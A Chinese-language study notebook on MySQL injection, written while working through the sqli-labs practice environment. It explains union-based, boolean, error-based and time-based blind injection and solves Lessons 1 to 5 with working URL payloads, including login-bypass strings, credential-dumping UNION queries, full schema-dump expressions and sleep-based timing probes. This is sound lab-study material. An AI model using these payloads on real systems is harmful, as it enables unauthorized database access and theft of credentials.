Mysql 注入天书——学习笔记

<div class="toc">
<h1>目录</h1>
<ul>
<li><a href="#一搭建环境--sqli-sql介绍">一、搭建环境 &amp; sqli-sql介绍</a></li>
<li><a href="#二第一部分--page-1-basic-challenges-background-1-基础知识">二、第一部分__page-1 Basic Challenges Background-1 基础知识</a>
<ul>
<li><a href="#系统函数">系统函数</a></li>
<li><a href="#字符串连接函数">字符串连接函数</a></li>
<li><a href="#常用语句">常用语句</a></li>
<li><a href="#一般常识语句">一般常识语句</a></li>
<li><a href="#union操作符">UNION操作符</a></li>
<li><a href="#运算符相关">运算符相关</a></li>
<li><a href="#sql-shell">sql shell</a></li>
</ul>
</li>
<li><a href="#三答题模式-基础知识-less14">三、答题模式-基础知识-Less1~4</a>
<ul>
<li><a href="#less-1">Less-1</a></li>
<li><a href="#less-2">Less-2</a></li>
<li><a href="#less-3">Less-3</a></li>
<li><a href="#less-4">Less-4</a></li>
<li><a href="#less-11">Less-11</a></li>
</ul>
</li>
<li><a href="#四background-2-盲注的讲解">四、Background-2 盲注的讲解</a>
<ul>
<li><a href="#基于布尔sql盲注构造逻辑判断">基于布尔sql盲注——构造逻辑判断</a>
<ul>
<li><a href="#mid函数">mid()函数</a></li>
<li><a href="#substr函数">substr()函数</a></li>
<li><a href="#left函数">Left()函数</a></li>
<li><a href="#ord函数">ord()函数</a></li>
<li><a href="#ascii函数">ascii函数</a></li>
<li><a href="#正则注入">正则注入</a></li>
</ul>
</li>
<li><a href="#思考一个问题limit是限定输出并不是限定正则哦">思考一个问题？limit是限定输出，并不是限定正则哦。</a></li>
<li><a href="#基于报错的sql盲注构造payload让信息通过错误提示回显出来">基于报错的SQL盲注——构造payload让信息通过错误提示回显出来</a></li>
<li><a href="#基于时间的sql盲注延时注入">基于时间的SQL盲注——延时注入</a>
<ul>
<li><a href="#利用sleep延时注入语句">利用sleep()延时注入语句</a></li>
<li><a href="#性测测试延迟注入">性测测试延迟注入</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#五答题模式-盲注的讲解-less-56">五、答题模式-盲注的讲解-Less-5~6</a>
<ul>
<li><a href="#less-5">Less-5</a></li>
<li><a href="#less-6">Less-6</a>
<ul>
<li><a href="#注意单引号和双引号不能混用"><strong>注意：单引号和双引号不能混用！！</strong></a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#六background-3-导入导出相关操作的讲解">六、Background-3 导入导出相关操作的讲解</a>
<ul>
<li><a href="#1-load-file导出文件">1. load_file()导出文件</a></li>
<li><a href="#2-文件导入到数据库">2. 文件导入到数据库</a></li>
<li><a href="#3-导入到文件">3. 导入到文件</a></li>
</ul>
</li>
<li><a href="#七答题模式-background-3-导入导出相关操作的讲解-less-716">七、答题模式-Background-3 导入导出相关操作的讲解-Less-7~16</a>
<ul>
<li><a href="#less-7">Less-7</a></li>
<li><a href="#less-8">Less-8</a></li>
<li><a href="#less-9">Less-9</a></li>
<li><a href="#less-10">Less-10</a></li>
<li><a href="#less-11-1">Less-11</a></li>
<li><a href="#less-12">Less-12</a></li>
<li><a href="#less-13">Less-13</a></li>
<li><a href="#less-14">Less-14</a></li>
<li><a href="#less-15">Less-15</a></li>
<li><a href="#less-16">Less-16</a></li>
</ul>
</li>
<li><a href="#八background-4-增删改函数介绍">八、Background-4 增删改函数介绍</a>
<ul>
<li><a href="#增加-insert">增加 Insert</a></li>
<li><a href="#删除-delete-drop">删除 delete drop</a></li>
<li><a href="#修改">修改</a></li>
</ul>
</li>
<li><a href="#九答题模式-less-17">九、答题模式-Less-17</a>
<ul>
<li><a href="#less-17">Less-17</a>
<ul>
<li><a href="#指引思考为什么我们不在username处进行构造呢">指引思考：为什么我们不在username处进行构造呢？</a>
<ul>
<li><a href="#addslashes">addslashes()</a></li>
<li><a href="#stripsslashes">stripsslashes()</a></li>
<li><a href="#mysql-real-escape-string">mysql_real_escape_string()</a></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li><a href="#十background-5-http头部介绍">十、Background-5 HTTP头部介绍</a></li>
<li><a href="#十一答题模式-less-1822">十一、答题模式-Less-18~22</a>
<ul>
<li><a href="#less-18">Less-18</a></li>
<li><a href="#less-19">Less-19</a></li>
<li><a href="#less-20">Less-20</a></li>
<li><a href="#less-21">Less-21</a></li>
<li><a href="#less-22">Less-22</a></li>
</ul>
</li>
<li><a href="#十二第二部分--page-2-advacned-injection-less-2328a">十二、第二部分__page-2 Advacned injection Less-23~28a</a>
<ul>
<li><a href="#less-23">Less-23</a></li>
<li><a href="#less-24">Less-24</a></li>
<li><a href="#less-25">Less-25</a></li>
<li><a href="#less-25a">Less-25a</a></li>
<li><a href="#less-26">Less-26</a></li>
<li><a href="#less-26a">Less-26a</a></li>
<li><a href="#less-27">Less-27</a></li>
<li><a href="#less-27a">Less-27a</a></li>
<li><a href="#less-28">Less-28</a></li>
<li><a href="#less-28a">Less-28a</a></li>
</ul>
</li>
<li><a href="#十三background-6-服务器两层架构">十三、Background-6 服务器（两层）架构</a></li>
<li><a href="#十四答题模式-less-2931">十四、答题模式-Less-29~31</a>
<ul>
<li><a href="#less-29">Less-29</a></li>
<li><a href="#less-30">Less-30</a></li>
<li><a href="#less-31">Less-31</a></li>
</ul>
</li>
<li><a href="#十五background-7-宽字节注入">十五、Background-7 宽字节注入</a>
<ul>
<li><a href="#首先介绍宽字节注入">首先介绍宽字节注入：</a></li>
</ul>
</li>
<li><a href="#十六答题模式-less-3237">十六、答题模式-Less-32~37</a>
<ul>
<li><a href="#less-32">Less-32</a></li>
<li><a href="#less-33">Less-33</a></li>
<li><a href="#less-34">Less-34</a></li>
<li><a href="#less-35">Less-35</a></li>
<li><a href="#less-36">Less-36</a></li>
<li><a href="#less-37">Less-37</a></li>
</ul>
</li>
<li><a href="#十七第三部分--page-3-stacked-injection-background-8-stacked-injection">十七、第三部分__page-3 Stacked injection Background-8 stacked injection</a>
<ul>
<li><a href="#0x01-原理介绍">0x01 原理介绍</a></li>
<li><a href="#0x02-堆叠注入的局限性">0x02 堆叠注入的局限性</a></li>
<li><a href="#0x03-各个数据库实例介绍">0x03 各个数据库实例介绍</a></li>
</ul>
</li>
<li><a href="#十八答题模式-less-3845">十八、答题模式-Less-38~45</a>
<ul>
<li><a href="#less-38">Less-38</a></li>
<li><a href="#less-39">Less-39</a></li>
<li><a href="#less-40">Less-40</a></li>
<li><a href="#less-41">Less-41</a></li>
<li><a href="#less-42">Less-42</a></li>
<li><a href="#less-43">Less-43</a></li>
<li><a href="#less-44">Less-44</a></li>
<li><a href="#less-45">Less-45</a></li>
</ul>
</li>
<li><a href="#十九background-9-order-by-后的injection">十九、Background-9 order by 后的injection</a></li>
<li><a href="#二十答题模式-less-4653">二十、答题模式-Less-46~53</a>
<ul>
<li><a href="#less-46">Less-46</a></li>
<li><a href="#less-47">Less-47</a></li>
<li><a href="#less-48">Less-48</a></li>
<li><a href="#less-49">Less-49</a></li>
<li><a href="#less-50">Less-50</a></li>
<li><a href="#less-51">Less-51</a></li>
<li><a href="#less-52">Less-52</a></li>
<li><a href="#less-53">Less-53</a></li>
</ul>
</li>
<li><a href="#二十一第四部分page-4-challenges-答题模式less-5464">二十一、第四部分/page-4 Challenges 答题模式Less-54~64</a>
<ul>
<li><a href="#less-54">Less-54</a></li>
<li><a href="#less-55">Less-55</a></li>
<li><a href="#less-56">Less-56</a></li>
<li><a href="#less-57">Less-57</a></li>
<li><a href="#less-58">Less-58</a></li>
<li><a href="#less-59">Less-59</a></li>
<li><a href="#less-60">Less-60</a></li>
<li><a href="#less-61">Less-61</a></li>
<li><a href="#less-62">Less-62</a></li>
<li><a href="#less-63">Less-63</a></li>
<li><a href="#less-64">Less-64</a></li>
<li><a href="#less-65">Less-65</a></li>
</ul>
</li>
<li><a href="#二十二后记">二十二、后记</a></li>
</ul>
</div>



# 一、搭建环境 & sqli-sql介绍

SQLI，sql injection，我们称之为sql 注入。

sql，英文：Structured Query Language，结构化查询语言。

sqli-labs 安装 ：由于本地 wamp 环境已经完善，则直接安装，修改代码中的数据库连接部分，然后启动 setup/reset database for labs ，即可完成安装。


# 二、第一部分__page-1 Basic Challenges Background-1 基础知识

### 系统函数
- version()——MySQL 版本
- user()——数据库用户名
- database()——数据库名
- @@datadir——数据库路径
- @@version_compile_os——操作系统版本
- @@hostname——主机名

### 字符串连接函数
- concat(str1,str2,...)——没有分隔符地连接字符串
- concat_ws(separator,str1,str2,...)——含有分隔符地连接字符串
- group_concat(str1,str2,...)——连接一个组的所有字符串，并以逗号分隔每一条数据

### 常用语句
列出所有的数据库
```sql
select group_concat(schema_name) from information_schema.schemata
```
列出某个库当中所有的表
```sql
select group_concat(table_name) from information_schema.tables where table_schema='xxxxx'
```

### 一般常识语句
> PS: url编码后的#为%23，空格为%20，单引号为%27，--+可以用#替换，但注意#是浏览器锚点，是浏览器操作来的，应该少用。因此，可在url使用%23，--+会在SQL中被解析为#即注释
<br>**建议常用--+**
- or 1=1--+
- 'or 1=1--+
- "or 1=1--+
- )or 1=1--+
- ')or 1=1--+
- ") or 1=1--+
- "))or 1=1--+

### UNION操作符
UNION需要连接相同列数、相同数据类型、相同顺序的SELECT。

默认UNION操作符选取不同的值，如果要允许重复，请使用UNION ALL。

### 运算符相关
优先级 AND > OR
```sql
Select * from admin where username='admin' and password='admin'
```
经转换，可以得到下面绕过语句：
```sql
Select * from admin where username='admin' and password=''or 1=1#'
```
![][base64str_0]

运算操作比较：
```sql
1. Select * from users where id=1 and 1=1;
2. Select * from users where id=1 && 1=1;
3. Select * from users where id=1 & 1=1;
```
以上1和2是一样的，3的意思是id=1与1进行&位操作，id=1当作True，与1进行&运算，结果还是1

> ps: &的优先级大于=

### sql shell
常规语句
```sql
show databases;
use security;
show tables;
desc emails;
describe table;
show full columns from table;
```
information_schema是系统数据库，常用于进行前台攻击。
```sql
use information_schema;
show tables; # 查看information_schema系统数据库里的所有表
desc tables; # 查看tables这张表里的属性
select table_name from information_schema.tables where table_schema = "security"; # 查询security数据库里所有的数据表名
```
一般注入流程：
```sql
# 猜数据库
select schema_name from information_schema.schemat;
# 猜某库里的数据表
select table_name from information_schema.tables where table_schema='xxxxx';
# 猜某数据表里的所有列
select column_name from information_schema.columns where table_name='xxxxx'
# 获取内容
select *** from ***;
```
> 注意：order by 4 是根据数据的第4列来排的，可以从此处推出表的列数。<br>


# 三、答题模式-基础知识-Less1~4

### Less-1
sql的报错会用单引号括起来，在看报错的时候注意先提取出报错的sql语句，再进行判断<br>
根据result.txt的结果，猜#被过滤，以后可以尝试--+

UNION的功能可以猜出表的列数，如：`union select 1,2--+`<br>
当数据不存在时候联查出构造的union数据。
> 注意：union all允许重复值。

- 得到数据库名<br>
 `'or 1=2 union select 1,database()--+`
- 得到所有数据库名：<br>
`?id=-1' union select 1,2,group_concat(schema_name) from information_schema.schemata--+`
- 得到security数据库的所有表名:<br>
`?id=-1'  union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='security'--+`
- 得到users表列属性<br>
`?id=-1'  union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users' --+`
- 得到security数据库users表的列属性<br>
`?id=-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_schema='security' and table_name='users' --+`
- 爆数据
`?id=-1' union select 1,username,password from users --+`

### Less-2
sql查询也可能会使用整型where语句，因此也会直接--+得到结果<br>
整型后注释即可：<br>
`?id=1--+`<br>
`?id=1 or 1=1 --+`

### Less-3
直接`?id=1'`会报错：`near ''1'') LIMIT 0,1' at line 1`<br>
这意味着：`Select login_name, select password from table where id= ('our input here')`<br> 
因此可得`1'`后的是单引号且已闭合，缺少语句是`)`，补充语句后即可：`?id=1')--+`

### Less-4
与Less-3差不多一致，是单引号与双引号的区别而已<br>
使用`?id=1") union select 1,2,3--+`即可构造注入

### Less-11
使用网络监控得到post请求的数据，然后在hackbar构造post请求即可


# 四、Background-2 盲注的讲解

盲注是在sql注入时执行命令后没有回显的尝试，盲注分为三类：
- 基于布尔的sql盲注
- 基于报错的sql盲注
- 基于时间的sql盲注

### 基于布尔sql盲注——构造逻辑判断
借用逻辑判断构造注入。<br>
Sql注入截取字符串常用函数博客：<https://www.cnblogs.com/lcamry/p/5504374.html><br>
三大法宝：`mid()`&emsp;`substr()`&emsp;`left()`

##### mid()函数
次函数为截取字符串一部分：`MID(column_name,start[,length])`
| 参数        | 描述 |
| ----        | -----|
| column_name | 必需。要提取字符的字段|
| start       | 必需。规定开始位置（起始值是 1）|
| length      | 可选。要返回的字符数。如果省略，则 MID() 函数返回剩余文本。 |

> Eg:      str="123456"     mid(str,2,1)    结果为2

> sql用例：<br>
（1）MID(DATABASE(),1,1)>’a’,查看数据库名第一位，MID(DATABASE(),2,1)查看数据库名第二位，依次查看各位字符。<br>
（2）MID((SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE T table_schema=0xxxxxxx LIMIT 0,1),1,1)>’a’此处column_name参数可以为sql语句，可自行构造sql语句进行注入。

##### substr()函数
Substr()和substring()函数实现的功能是一样的，均为截取字符串。<br>
`string substring(string, start, length)`<br>
`string substr(string, start, length)`

> 参数描述同mid()函数，第一个参数为要处理的字符串，start为开始位置，length为截取的长度。

##### Left()函数
Left()得到字符串左部开始指定个数的字符：`Left ( string, n )`<br>
string为要截取的字符串，n为长度。
> Sql用例：<br>
(1) left(database(),1)>’a’,查看数据库名第一位，left(database(),2)>’ab’,查看数据库名前二位。<br>
(2) 同样的string可以为自行构造的sql语句。

##### ord()函数
同时也要介绍ORD()函数，此函数为返回第一个字符的ASCII码，经常与上面的函数进行组合使用。<br>
> EG: `ORD(MID(DATABASE(),1,1))>114`<br> 意为检测database()的第一位ASCII码是否大于114，也即是'r'

ascii中：48～57为0到9十个阿拉伯数字，65～90为26个大写英文字母，97～122号为26个小写英文字母。

##### ascii函数
Ascii()将某个字符转换为ascii 值。
> EG:<br>
查看当前数据库第一个表名的第一个字符：`select ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1));`<br>
布尔值判断：`ascii(substr((select database()),1,1))=98`

##### 正则注入
sql中正则注入作者博客：https://www.cnblogs.com/lcamry/articles/5717442.html>

> EG：
> 1. 判断第一个表名的第一个字符是否是a-z中的字符,其中blind_sqli是假设已知的库名<br>
> 注：正则表达式中 ^\[a-z] 表示字符串中开始字符是在 a-z范围内<br>
`index.php?id=1 and 1=(SELECT 1 FROM information_schema.tables WHERE TABLE_SCHEMA="blind_sqli" AND table_name REGEXP '^[a-z]' LIMIT 0,1) /*`
> 2. 判断第一个表名的第一个字符是否是a-z中的字符,其中blind_sqli是假设已知的库名<br>
`index.php?id=1 and 1=(SELECT 1 FROM information_schema.tables WHERE TABLE_SCHEMA="blind_sqli" AND table_name REGEXP '^[a-n]' LIMIT 0,1)/*`
> 3. 确定该字符为n<br>
`index.php?id=1 and 1=(SELECT 1 FROM information_schema.tables WHERE TABLE_SCHEMA="blind_sqli" AND table_name REGEXP '^n' LIMIT 0,1) /*`
> 4. 表达式的更换如下<br>
**`expression like this: '^n[a-z]' -> '^ne[a-z]' -> '^new[a-z]' -> '^news[a-z]' -> FALSE`**<br>
这时说明表名为news ，要验证是否是该表明 正则表达式为'^news$'，但是没这必要 直接判断 table_name = ’news‘ 不就行了。
> 5. 接下来猜解其它表了<br>
实验表明：在limit 0,1下，regexp会匹配所有的项，regexp匹配的时候会在所有的项都进行匹配<br>
`select * from users where id=1 and 1=(select 1 from information_schema.tables where table_schema='security' and table_name regexp '^u[a-z]' limit 0,1);是正确的`

- **注意：limit注意使用参数，配合限定where条件。limit 0,1是表示从第1条数据开始，取1条！默认开始为0，当为limit 2时表示取前2条记录。**

其他示例：
0. `select user() regexp '^ro';` 假如用户为root等，查询会返回1。
1. `select * from users where id=1 and 1=(if((user() regexp '^r'),1,0));`<br>
2. `select * from users where id=1 and 1=(user() regexp '^ro')`<br>
3. `select * from users where id=1 and 1=(select 1 from information_schema.tables where table_schema='security' and table_name regexp '^us[a-z]' limit 0,1);`

### 思考一个问题？limit是限定输出，并不是限定正则哦。


实验操作实例：security有emails,referers,uagents,users四个表
- 当`select table_name from information_schema.tables where table_schema='security' and table_name regexp '^[a-z]';`的时候，会把四个表都查询出：

| table_name |
| ---------- |
| emails     |
| referers   |
| uagents    |
| users      |

- 当`select table_name from information_schema.tables where table_schema='security' and table_name regexp '^[a-z]' limit 0,1;`或者`limit 1`的时候：

| table_name |
| ---------- |
| emails     |

- 当`select table_name from information_schema.tables where table_schema='security' and table_name regexp '^[a-z]' limit 2;`的时候：

| table_name |
| ---------- |
| emails     |
| referers   |

- 当`select table_name from information_schema.tables where table_schema='security' and table_name regexp '^[a-z]' limit 1,1;`的时候，结果是：

| table_name |
| ---------- |
| referers   |

- **注意此处**，当`select table_name from information_schema.tables where table_schema='security' and table_name regexp '^r[a-z]' limit 1,1;`的时候，结果是：

**Empty set (0.00 sec)**

**解析**：因为假如没有limit限制，会得到referers这个表，这里Limit从输出限制第2条开始取1条记录，显然是无输出。（limit 0,1表示从第1条记录取1条）

> 在这里我们应该明白到，limit只是限定查询的输出，并不是指限定由第2条记录来进行正则匹配。<br>
我们也无须知道表的顺序，只要有这个表即可。<br>
同时，也应当善用正则的$结尾符，还有like这个模糊匹配，如`like 'ro%'`

** |--->探索rand()的秘密 **

help rand;得到如下结果
```sql
Name: 'RAND'
Description:
Syntax:
RAND(), RAND(N)

Returns a random floating-point value v in the range 0 <= v < 1.0. If a
constant integer argument N is specified, it is used as the seed value,
which produces a repeatable sequence of column values. In the following
example, note that the sequences of values produced by RAND(3) is the
same both places where it occurs.
# rand()返回范围为0 <= v <1.0的随机浮点值v。
# 如果一个指定了常量整数参数N，它用作种子值，产生可重复的列值序列。
# 在下面的例如，请注意RAND（3）产生的值序列是发生的两个地方都一样。

URL: http://dev.mysql.com/doc/refman/5.6/en/mathematical-functions.html

Examples:
mysql> CREATE TABLE t (i INT);
Query OK, 0 rows affected (0.42 sec)

mysql> INSERT INTO t VALUES(1),(2),(3);
Query OK, 3 rows affected (0.00 sec)
Records: 3  Duplicates: 0  Warnings: 0

mysql> SELECT i, RAND() FROM t;
+------+------------------+
| i    | RAND()           |
+------+------------------+
|    1 | 0.61914388706828 |
|    2 | 0.93845168309142 |
|    3 | 0.83482678498591 |
+------+------------------+
3 rows in set (0.00 sec)

mysql> SELECT i, RAND(3) FROM t;
+------+------------------+
| i    | RAND(3)          |
+------+------------------+
|    1 | 0.90576975597606 |
|    2 | 0.37307905813035 |
|    3 | 0.14808605345719 |
+------+------------------+
3 rows in set (0.00 sec)

mysql> SELECT i, RAND() FROM t;
+------+------------------+
| i    | RAND()           |
+------+------------------+
|    1 | 0.35877890638893 |
|    2 | 0.28941420772058 |
|    3 | 0.37073435016976 |
+------+------------------+
3 rows in set (0.00 sec)

mysql> SELECT i, RAND(3) FROM t;
+------+------------------+
| i    | RAND(3)          |
+------+------------------+
|    1 | 0.90576975597606 |
|    2 | 0.37307905813035 |
|    3 | 0.14808605345719 |
+------+------------------+
3 rows in set (0.01 sec)
```
此处表现，rand(seed)时候每次查询结果是一样，但同一次不同行查询的随机值不同。rand()是每次都随机取种子值，每次结果都不同。

生成5到10（含）之间的随机整数数的示例：
```sql
SELECT 
  FLOOR(RAND()*(10-5+1)+5) 'Result 1',
  FLOOR(RAND()*(10-5+1)+5) 'Result 2',
  FLOOR(RAND()*(10-5+1)+5) 'Result 3';
```


### 基于报错的SQL盲注——构造payload让信息通过错误提示回显出来

在这里我们需要的是sql报错，示例如下：

- `Select 1,count(*),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)*2)) a from information_schema.columns group by a;`

    ERROR 1062 (23000): Duplicate entry '::root@localhost::1' for key 'group_key'<br>

    这里我们不是十分明白其中的报错原因，大概原理为分组后数据计数时重复造成的错误，也有解释为mysql的bug问题，此处需要将rand()和rand(0)多试几次才行。

- `select count(*) from information_schema.tables group by concat(version(),floor(rand(0)*2));`

    ERROR 1062 (23000): Duplicate entry '5.6.171' for key 'group_key'
    
    这里得到version()的值为5.6.17，后面的1是由rand(0)得出，此处rand(0)会从随机的固定值得出一个随机值，floor(rand(0)*2)可得出0或1。
    
- `select count(*) from (select 1 union select null union select !1) t group by concat(version(),floor(rand(0)*2));`
    
    ERROR 1062 (23000): Duplicate entry '5.6.171' for key 'group_key'
    
    假如关键表被禁用，可以使用这种方式。<br>
    这里`select 1 union select null union select !1`会得出1,NULL,0。<br>
    还是在分组的时候会出mysql报错，而且必须是concat连接floor的随机整数才会分组失败，正常的‘1’字符串concat连接后是分组正常的。

- `select min(@a:=1) from information_schema.tables group by concat(table_name,@a:=(@a+1)%2)`
    
    如果rand()被禁用，可以使用用户变量来报错。
    放弃研究注意：select min(@a:=1) from information_schema.tables group by concat(table_name,@a:=(@a+1)%2)，这里是得到一个表名，证明存在漏洞即可。

- `select exp(~(select * FROM(SELECT USER())a));`
    
    ERROR 1690 (22003): DOUBLE value is out of range in 'exp(~((select 'root@localhost' from dual)))'
    
    // y = Exp(x)是以e为底的指数函数，即y=e的x次方。<br>
    其中 exp(-2) = 0.13533528323661，exp(0) = 1，exp(1) = 2.718281828459045。版本在5.5.5及以上。
    
    这里是double数值类型超出范围，user() = root@localhost，~(root@localhost) = 18446744073709551615，exp(数值>709)会报错。
    
    **使用exp进行SQL报错注入参考文章**：<https://www.cnblogs.com/lcamry/articles/5509124.html>
    
    * 0x01 概述
    
        \~是按位取反，~0=18446744073709551615，是最大的无符号BIGINT值。
        
    * 0x02 注入
        
        通过构造子查询并取反，造成一个DOUBLE overflow error，并借由此注出数据。
    
    * 0x03 注出数据——得到表名
    
        `select exp(~(select*from(select table_name from information_schema.tables where table_schema=database() limit 0,1)x));`
    
        ERROR 1690 (22003): DOUBLE value is out of range in 'exp(~((select 'emails' from dual)))'

    * 0x03 注出数据——得到列名
        
        `select exp(~(select*from(select column_name from information_schema.columns where table_name='users' limit 0,1)x));`
        
        ERROR 1690 (22003): DOUBLE value is out of range in 'exp(~((select 'user_id' from dual)))
        
        放弃研究注意：这里只是得出单条数据，单条记录，个人讨论后无法从limit下手的，报错机制并没有给出预期结果，请从下面的@遍历爆出吧！
    
    * 0x03 注出数据——检索数据
    
        `select exp(~ (select*from(select concat_ws(':',id, username, password) from users limit 0,1)x));`
        
        ERROR 1690 (22003): DOUBLE value is out of range in 'exp(~((select '1:Dumb:Dumb' from dual)))'
        
    * 0x04 一蹴而就
    
        这个查询可以从当前上下文中dump出所有的tables和columns。
        
        ```sql
        # 例如url:
        http://localhost/dvwa/vulnerabilities/sqli/?id=1' or exp(~(select*from(select(concat(@:=0,(select count(*)from`information_schema`.columns where table_schema=database()and@:=concat(@,0xa,table_schema,0x3a3a,table_name,0x3a3a,column_name)),@)))x))-- -&Submit=Submit#
        
        # 这里可以直接从mysql shell查询出来：
        select exp(~(select*from(select(concat(@:=0,(select count(*)from`information_schema`.columns where table_schema=database()and@:=concat(@,0xa,table_schema,0x3a3a,table_name,0x3a3a,column_name)),@)))x));
        
        # 返回结果如下
        ERROR 1690 (22003): DOUBLE value is out of range in 'exp(~((select '000
        security::emails::id
        security::emails::email_id
        security::referers::id
        security::referers::referer
        security::referers::ip_address
        security::uagents::id
        security::uagents::uagent
        security::uagents::ip_address
        security::uagents::username
        security::users::id
        security::users::username
        security::users::password' from dual)))'
        
        # 注意上述语句也可以在其他增删改查均可以注入哦，其中exp需要在mysql5.5.5及以上版本。
        ```
        
        最终语句如下：
        ```sql
        exp(~(select*from(select(concat(@:=0,(select count(*)from`information_schema`.columns where table_schema=database()and@:=concat(@,0xa,table_schema,0x3a3a,table_name,0x3a3a,column_name)),@)))x))
        ```
        
- `select !(select * from (select user())x) - ~0;`

    ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in '((not((select 'root@localhost' from dual))) - ~(0))'
    
    注意这里是减号。
    
    **基于BIGINT溢出错误的SQL注入**：<https://www.cnblogs.com/lcamry/articles/5509112.html>
    
    * 0x01 概述
        
        数据类型BIGINT的长度为8字节，也就是说，长度为64比特，最大数值为9223372036854775807。
    
        ~0是逐位取反，得到的是无符号最大值，为18446744073709551615。
    
    * 0x02 注入技术
        
        如果我们对~0进行加减运算的话，会导致BIGINT溢出错误。因此，我们利用子查询引起BIGINT溢出，设法提取数据。
        
        我们知道，一个查询成功返回，其返回值为0，逻辑非运算得1。示例：
        
        `mysql> select !(select*from(select user())x);`
    
        | !(select*from(select user())x) |
        |--------------------------------|
        |                              1 |
        1 row in set (0.00 sec)
    
        我们再对其进行加减运算：
        
        `select ~0+!(select*from(select user())x);`
        
        ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in '(~(0) + (not((select 'root@localhost' from dual))))'
        
        注意：我们不常用加法，因为“+”通过网页浏览器解析会转为空白符，此时可以用%2b来表示+。**常用减法**。
        
        最终语句如下：
        ```sql
        !(select*from(select user())x)-~0
        (select(!x-~0)from(select(select user())x)a)
        (select!x-~0.from(select(select user())x)a)
        ```
    
    * 0x03 提取数据——获得表名
        
        `select !(select*from(select table_name from information_schema.tables where table_schema=database() limit 0,1)x)-~0;`
        
        ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in '((not((select 'emails' from dual))) - ~(0))'
        
    * 0x03 提取数据——获得列名
     
        `select !(select*from(select column_name from information_schema.columns where table_name='users' limit 0,1)x)-~0;`
    
        ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in '((not((select 'user_id' from dual))) - ~(0))'
    
    * 0x03 提取数据——检索数据
    
        `select !(select*from(select concat_ws(':',id, username, password) from users limit 0,1)x)-~0;`
        
        ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in '((not((select '1:Dumb:Dumb' from dual))) - ~(0))'
        
    * 0x04 一次性转储
        
        ```sql
        !(select*from(select(concat(@:=0,(select count(*)from`information_schema`.columns where table_schema=database()and@:=concat(@,0xa,table_schema,0x3a3a,table_name,0x3a3a,column_name)),@)))x)-~0
        
        (select(!x-~0)from(select(concat (@:=0,(select count(*)from`information_schema`.columns where table_schema=database()and@:=concat (@,0xa,table_name,0x3a3a,column_name)),@))x)a)
        
        (select!x-~0.from(select(concat (@:=0,(select count(*)from`information_schema`.columns where table_schema=database()and@:=concat (@,0xa,table_name,0x3a3a,column_name)),@))x)a)
        ```
        
        注意，毕竟我们是通过错误消息来检索数据的，在从当前数据库转储检索时，会限制了最多27个结果，即最多会返回27个列，多出的都无法返回。
        
        当然，以上3条语句均可以在增删改查其他地方进行注入攻击。
        
        另外需要再次注意的一点是，这些均因为mysql 5.5.5及以上版本会提供mysql_error()。

- `select extractvalue(1,concat(0x7e,(select @@version),0x7e));`

    ERROR 1105 (HY000): XPATH syntax error: '~5.6.17~'
    
    解释：mysql 对xml 数据进行检查查询的xpath 函数，xpath 语法错误
    
- `select updatexml(1,concat(0x7e,(select @@version),0x7e),1);`

    ERROR 1105 (HY000): XPATH syntax error: '~5.6.17~'
    
    解释：//mysql 对xml 数据进行修改的xpath 函数，xpath 语法错误，注意顺序不能调换
    
- `select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x;`

    ERROR 1060 (42S21): Duplicate column name '5.6.17'

    解释：mysql 重复特性，此处重复了version，所以报错。


### 基于时间的SQL盲注——延时注入

基础判断执行sleep：`select If(ascii(substr(database(),1,1))>115,0,sleep(5))%23` <br>
其中115是s，%23是#

##### 利用sleep()延时注入语句
`select sleep(find_in_set(mid(@@version, 1, 1), '0,1,2,3,4,5,6,7,8,9,.'));`

| sleep(find_in_set(mid(@@version, 1, 1), '0,1,2,3,4,5,6,7,8,9,.')) |
|---------------------------------------------------------|
|                                                       0 |

1 row in set (1.00 sec)

解释：find_in_set表示从后面set找前面的元素，这里元素version的第一个值是5，得到的index是6，所以会停顿6秒，并且查询成功，返回0。

##### 性测测试延迟注入
```sql
UNION 
SELECT 
IF(SUBSTRING(current,1,1)=CHAR(115),BENCHMARK(5000000,ENCODE('MSG','by 5 seconds')),null)
FROM (select database() as current) as tb1;
```

解释：BENCHMARK(count,expr)用于测试函数的性能，参数一为次数，二为要执行的表达式。可以让函数执行若干次，返回结果比平时要长，通过时间长短的变化，判断语句是否执行成功。这是一种边信道攻击，在运行过程中占用大量的cpu 资源。推荐使用sleep()函数进行注入。


# 五、答题模式-盲注的讲解-Less-5~6

### Less-5
直接加 `?id=1'#` ，这时候会报错语法错误 `syntax to use near '' LIMIT 0,1' at line 1`

那么我们应该要明白，报错多出的sql语句是 `' LIMIT 0,1` ，那么我们构造后的php语句就可能是：<br>
`  $sql = "select * from users where id='1' # ' limit 0,1 "  `

那么sql的语法错误就是： `' limit 0,1`

这时候我们需要的操作是将#替换成%23，但是**常用将 # 换成 --+** ，这时候会正常注释了多余出来的sql语句，即成功绕过。

在Less-5中，正常sql查询后会显示一个常量，因此我们需要操作的是对sql查询时候注入判断，正常执行后根据时候返回常量判断注入正确性。

开始布尔逻辑注入：

- 此处注入：<br>
    `?id=1' and left(version(),1)=5--+`<br>
    `?id=1' and left(version(),1)=4--+`

    可见是返回得到版本号是mysql5.版本。

- 继续注入：<br>
    `?id=1' and ascii(left(database(),1))=115--+`<br>
    此时是正常返回，那么可知115对应s，那么数据库名可以猜出了。

- `?id=1' and length(database())=8--+`<br>
    正常返回，可知数据库名长度为8。

-   `?id=1' and left(database(),2)>'sa'--+`<br>
    `?id=1' and left(database(),2)='se'--+`
    正常返回，可逐个猜库名。

-    `?id=1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),2,1))=109--+`<br>
    109是m，这里是逐个猜表名的思路。

- `?id=1' and 1=(select 1 from information_schema.columns where table_name='users' and table_schema=database() and column_name regexp '^pa' limit 0,1)--+`<br>
    继续猜表的列名，这里使用regexp匹配猜当前库的users表里是否存在pa开头的列名。

